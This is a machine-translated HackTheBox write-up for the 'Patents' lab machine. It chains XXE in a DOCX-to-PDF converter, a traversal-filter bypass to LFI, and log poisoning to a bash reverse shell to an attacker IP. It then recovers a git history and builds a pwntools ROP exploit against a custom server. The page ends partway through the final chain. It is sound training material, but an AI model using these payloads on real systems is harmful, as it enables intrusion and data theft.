<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§π ‚ûó üßòüèª HackTheBox. Passing Patents. XXE via DOCX, LFI to RCE, GIT, and ROP-chain files ü§¢ üçÑ üïµüèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I continue to publish solutions sent for further processing from the HackTheBox site . 
 
 In this article, we exploit XXE in the service for converti...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox. Passing Patents. XXE via DOCX, LFI to RCE, GIT, and ROP-chain files</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/502268/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/3s/xg/mc3sxg5brnrlwn3qmajb37t8bhk.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I continue to publish solutions sent for </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">further processing</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from the </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> site </font><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In this article, we exploit XXE in the service for converting DOCX documents to PDF, get RCE via LFI, dig into the GIT history and restore files, compose ROP chains using pwntools and find a hidden root file. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Connection to the laboratory is via VPN. </font><font style="vertical-align: inherit;">It is recommended not to connect from a work computer or from a host where the data important to you is available, since you get into a private network with people who know something in the field of information security :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organizational Information</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This machine has an IP address 10.10.10.173, which I add to / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.173    patents.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
First, we scan open ports. </font><font style="vertical-align: inherit;">Since it takes a long time to scan all the ports with nmap, I will first do this with masscan. </font><font style="vertical-align: inherit;">We scan all TCP and UDP ports from the tun0 interface at a speed of 500 packets per second.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.173 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7v/ex/jr/7vexjrz3cmdge_csif-0ruxstxy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now, for more detailed information about the services that operate on ports, we will run a scan with the -A option.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A patents.htb -p22,80,8888</code></pre><br>
<img src="https://habrastorage.org/webt/nk/d8/jm/nkd8jml8rg_aau8otsuwznq-ab0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The host runs SSH services and the Apache web server, with port 8888 reserved for an incomprehensible service. </font><font style="vertical-align: inherit;">Let's see the web. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q4/ba/lv/q4balvxmcp7ac3m0qqge2qtwhcm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The site has a download form for DOCX documents.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/m4/xk/if/m4xkiftz0h6oxfikutspnmyijdy.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XXE DOCX</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
According to the statement, our document will be converted to PDF format. This suggests the thought of XXE. I took an example </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/eg/mo/fo/egmofoq1l5r8ohdmorvwf83gsfe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Thus, in this example, the host will try to download the xml document from the remote server. By downloading this document, he will read the local file specified in the downloaded xml document, encode it in base64 and will contact our server again, passing the encoded file as a request parameter. That is, having decoded this parameter, we get the file from the remote machine. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But this load should not be placed on the word / document.xml path. Since the OpenXML SDK is used to work with this type of document, it follows </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">from here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, server-side software will search for data in word / document.xml, and in customXML / item1.xml. Therefore, the load should be placed there. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's create a docx document and unzip it as a zip archive. After that, create the customXML directory and create the item1.xml file in it. In it we will write the code from the image above, changing the IP address to our own. And we archive the document back. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/s0/j_/gw/s0j_gwgd0ehur9mboxtcwz8eudg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now run the local web server.</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And in the current directory we create the second xml file, specifying / etc / passwd as the desired file. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/6y/5s/l7/6y5sl7j1lcilayxrtbebn9z78tw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And upload the document to the server. In the window with the web server running, we will see the reverse connection. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fj/za/to/fjzatoxzmrvwpkccdyekqyig_ju.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Decode base64 and get the file that was requested. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ef/wy/ty/efwytya0_ldxuvv1qd9qjphrib0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This way we can read files on the server. Let's read the Apache configuration files. To do this, change dtd.xml and repeat the download of the document. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/um/0q/xq/um0qxqy-zxbvhbbe-dgz2_05msy.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/-x/nf/zh/-xnfzhmk9bbhd8fjx5eko5vbaeg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
So we find out the directory in which the site is located. Let's try to read the configuration file. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_b/dd/-v/_bdd-vrylmvfa98iklgx3lnykzi.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/pq/5l/ht/pq5lhtyyzajjcijlbaa0hubw5j4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And the comment says the file was renamed due to vulnerability. We will of course refer to it </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">patents.htb / getPatent_alphav1.0.php</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hq/wd/hj/hqwdhjf6zhjdaehc2zn6ic5p3hu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Turning to this page and passing the path ../../../../../etc/passwd as the id parameter, all occurrences of ‚Äú../‚Äù will be deleted from our line. </font><font style="vertical-align: inherit;">Let's replace each line ‚Äú../‚Äù with ‚Äú... /. /‚Äù, So when deleting a sequence, ‚Äú../‚Äù will still remain. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fr/a3/pu/fra3pugykwho9xrl9xcklono1zg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we find LFI.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Entry point</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's try to get RCE from this. </font><font style="vertical-align: inherit;">Frankly - it was difficult. </font><font style="vertical-align: inherit;">The fact is that when sending such a document, we did not receive an offer to download PDF. </font><font style="vertical-align: inherit;">That is, descriptor 2 was used (to display diagnostic and debug messages in text form). </font><font style="vertical-align: inherit;">And we can turn to him. </font><font style="vertical-align: inherit;">Let's encode the reverse shell in base64:</font></font><br>
<br>
<pre><code class="bash hljs">/bin/bash -c <span class="hljs-string">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.211/4321 0&gt;&amp;1;'</span></code></pre><pre><code class="bash hljs">L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We will decode it and pass it to the system function in php. </font><font style="vertical-align: inherit;">Let's pass the code as an HTTP header when uploading a file.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/convert.php -F <span class="hljs-string">"userfile=@file.docx"</span> -F <span class="hljs-string">'submit=Generate PDF'</span> --referer <span class="hljs-string">'http://test.com/&lt;?php system(base64_decode("L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn")); ?&gt;'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Run netcat.</font></font><br>
<br>
<pre><code class="bash hljs">nc -lvp 4321</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And now let's turn to the second descriptor.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//proc//self//fd//2</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We get back connect. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 1</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Load the script system transfers </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">linpeas</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and carefully analyze the output. </font><font style="vertical-align: inherit;">So we work in a docker container. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sa/hf/xz/sahfxzrubyathg6rglkqhwf0cvo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We also find hashes. </font><font style="vertical-align: inherit;">But hacking, we come to nothing. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bf/cc/dy/bfccdyitk-1ksi7qmg5omq_lesw.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/dv/ss/up/dvssupnunggkpzz64gsfdxjveuw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Therefore, run </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pspy64</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to track running processes. </font><font style="vertical-align: inherit;">And we find the start of the process as root, in which the password is passed as an environment variable. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/2_/yz/wi2_yzfeqgi3eehjxylmqf7k8vm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And locally change the user by entering this password.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/iu/bi/yu/iubiyu543de3olgssz1ry-djuf4.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 2</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's see what this script does. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/vk/h-/ckvkh-wezr0ofumiqzzqakn5wog.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/rg/tf/rs/rgtfrsor5irhivfoifw-jr6c008.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We get a tip on some lfmserver, and also save the username and password. </font><font style="vertical-align: inherit;">Let's look in the system for everything related to lfm. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/hz/ea/afhzea8jusqqac6irjgch6kyvjy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we find the git repository in this directory. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ln/h4/op/lnh4opchyrjvoc88mmg8kiwe7_y.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's work with this repository. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gq/by/ge/gqbygeqd2j4xoshvorswvluxkno.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's see the history of changes. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/t7/ro/rj/t7rorjk0v42cfsjtphjd9uc1fs0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's see the history of changes. </font><font style="vertical-align: inherit;">So we see that in the penultimate commit, an executable file and description were added, and in the last, they were already deleted. </font><font style="vertical-align: inherit;">Let's roll back before deleting files.</font></font><br>
<br>
<pre><code class="bash hljs">git revert 7c6609240f414a2cb8af00f75fdc7cfbf04755f5</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And in our directory an executable file and description appeared. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ga/wc/4s/gawc4s_vovqdv6zz91jdrdbicfk.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/y5/ns/gi/y5nsgibu66e8a0_g_34mde9b2ao.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Here I already wanted to start reversing the file, but - we have a git project! </font><font style="vertical-align: inherit;">I found a commit that mentioned source codes. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7m/xr/ki/7mxrkibt8ixidkd4tir6ksasywk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And let's restore the files.</font></font><br>
<br>
<pre><code class="bash hljs">git checkout 0ac7c940010ebb22f7fbedb67ecdf67540728123</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
After that we download the source codes of interest, the program itself and the libraries to the local machine. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rop</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We need to try to find and exploit the vulnerability in the program, there are source codes to help. </font><font style="vertical-align: inherit;">Let's check the protection in a binary file. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/pq/fj/bd/pqfjbdyozi1qaxhxeauf1_hfcca.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
That is, the canary and PIE are missing, but the stack is not executable. </font><font style="vertical-align: inherit;">Let's open the binary file in any disassembler with a decompiler convenient for you (I use IDA Pro 7.2) and compare the decompiled code with the source codes from the repository. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/rc/ue/tzrcued2khgzxq9jmhziq7vsfl4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
To connect to the server and use the data from the checker.py file, as well as credentials. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xh/7b/aa/xh7baayunbtjue28qyfleddzqxc.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/-r/rp/mo/-rrpmoh0l0-hginwoubihqb3a_g.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's write an exploit template.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>)<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
username = <span class="hljs-string">"lfmserver_user"</span>
password = <span class="hljs-string">"!gby0l0r0ck$$!"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's now determine the request. </font><font style="vertical-align: inherit;">Launch the application. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wx/xj/iu/wxxjiuq1vfqmwzgrshyjzlmzzou.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You must send the path to the file and the hash of its contents. </font><font style="vertical-align: inherit;">For example, I took / etc / hosts. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/p0/3k/ek/p03kekiuesrd9mc2at4t_swcce0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Add the following code to the template.</font></font><br>
<br>
<pre><code class="python hljs">INPUTREQ = <span class="hljs-string">"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"</span>
file = <span class="hljs-string">"/etc/hosts"</span>
md5sum = <span class="hljs-string">"7d8fc74dc6cc8517a81a5b00b8b9ec32"</span><font></font>
send_ = INPUTREQ.format(file,username, password, md5sum)<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_.encode())<font></font>
<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now execute and get the 404 error. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/nd/b6/ejndb6z2tpkgvajgiq3akvwsbjg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's see the log file. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/d6/gf/qyd6gftg9f6m3ce87f9acdpsodc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It‚Äôs clear where the application is looking for a file, let's play with the paths and specify such a file.</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"../../../../../etc/hosts"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We will execute the code and we will not see any errors. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/sp/o-/pxspo-1bkqx14dpydxmj11odvyo.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/id/8x/7z/id8x7zspwbcbv1u9qmx-ccjhiis.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But in the case of urlencode, we get a response with code 200 from the server!</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts"</span></code></pre><br>
<img src="https://habrastorage.org/webt/uh/pt/s6/uhpts6ydsvnhutaadndkfzt_ejy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Great, let's get back to the disassembler. We find among the lines (Shift + F12) a successful server response. And let's see where it is accessed (X). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/ef/so/ckefsoopnkpezgsq6cdlguv7jh8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And we pass to the first function, where at the very beginning there is a verification of credentials. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8v/6y/jg/8v6yjgpj94ih9fln0dmhbl3_zas.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Let's rename the variable lines in the disassembler window to make it easier to understand in the decompiler. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/ut/vx/dzutvxrxvyv4tdq_zgldkiv9xqw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
And parsing the code in lines 18-24, understanding the following: part of the user input falls into the function sub_402DB9, where the string is converted to the variable name, which then falls into the access function, and if the result is negative, the message 404 is output. Thus, the variable name will be the path to the file. Since the request was processed even in urlencode encoding, this function is most likely needed for decoding.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mo/eb/wj/moebwjpolutcowo7qxeyi15dj-k.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But the fact is that the variable name, where the data is transferred, is of a limited size. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u_/jz/ht/u_jzhtdqgp1vgp3qyuguunuxl_i.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Thus, for buffer overflow, we need to transfer 0xA0 = 160 bytes. Let's add in the code the function of adding up to 160 bytes and encoding the path to the file. Since the hash is calculated from the contents of the file, it is necessary not to violate the integrity of the file path, that is, after the main path add 0x00 bytes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But the fact is that we need to know the hash from any file on the server, which will always be available and will never change. For example, / proc / sys / kernel / randomize_va_space, and as we recall from the output of linPEAS, ASLR is activated, that is, we know the hash. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/dk/j_/tzdkj_hdn9owhtmod5ekklqior4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Then change the code.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">append_and_encode</span>(<span class="hljs-params">file, rop=<span class="hljs-string">b""</span></span>):</span>
    ret = <span class="hljs-string">b""</span>
    path = (file + <span class="hljs-string">b"\x00"</span>).ljust(<span class="hljs-number">160</span>, <span class="hljs-string">b"A"</span>) + rop
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<font></font>
        ret += <span class="hljs-string">b"%"</span> + hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">"0"</span>).encode()
    <span class="hljs-keyword">return</span> ret<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"error"</span>)<font></font>
<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
INPUTREQ = <span class="hljs-string">b"CHECK /{1} LFM\r\nUser=lfmserver_user\r\nPassword=!gby0l0r0ck$$!\r\n\r\n{2}\n"</span>
md5sum = <span class="hljs-string">b"26ab0db90d72e28ad0ba1e22ee510510"</span><font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>)<font></font>
send_= INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It works successfully! </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k9/4f/5v/k94f5vkgarkqukz9vhjiprkt1yo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now let's use a memory leak and determine the address where the libc library is loaded. </font><font style="vertical-align: inherit;">To do this, we get the address of the write function in the loaded libc library.</font></font><br>
<br>
<pre><code class="python hljs">binary = ELF(<span class="hljs-string">"./lfmserver"</span>)<font></font>
libc = ELF(<span class="hljs-string">"./libc6.so"</span>)<font></font>
<font></font>
rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x6</span>, binary.got[<span class="hljs-string">'dup2'</span>])<font></font>
rop = flat(rop_binary.build())<font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)</code></pre><br>
<img src="https://habrastorage.org/webt/f0/5h/nl/f05hnlmsa7slih0sdwajq5kathy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now select the address of the dup2 function (the first 8 bytes). </font><font style="vertical-align: inherit;">Subtract the address of the dup2 function in the unloaded library from it. </font><font style="vertical-align: inherit;">This will find the base address of libc.</font></font><br>
<br>
<pre><code class="python hljs">print(<span class="hljs-string">f"[*] Payload sent"</span>)<font></font>
<font></font>
recv_ = r.recvall().split(<span class="hljs-string">b'\r'</span>)<font></font>
leak = u64(recv_[<span class="hljs-number">-1</span>][:<span class="hljs-number">8</span>])<font></font>
print(<span class="hljs-string">f"[*] Leak address: <span class="hljs-subst">{hex(leak)}</span>"</span>)<font></font>
libc.address = leak - libc.symbols[<span class="hljs-string">'dup2'</span>]<font></font>
print(<span class="hljs-string">f"[+] Libc base: <span class="hljs-subst">{hex(libc.address)}</span>"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/xf/t0/x3/xft0x3qwddfzdrfclwkj578gzpk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now find the address of the line / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It remains to collect the ROP, in which the standard I / O descriptors (0,1,2) will be redirected to the descriptor registered in the program (take 6). </font><font style="vertical-align: inherit;">After which the system function will be called, where we will pass the address of the line / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
rop = flat(rop_libc.build()) <font></font>
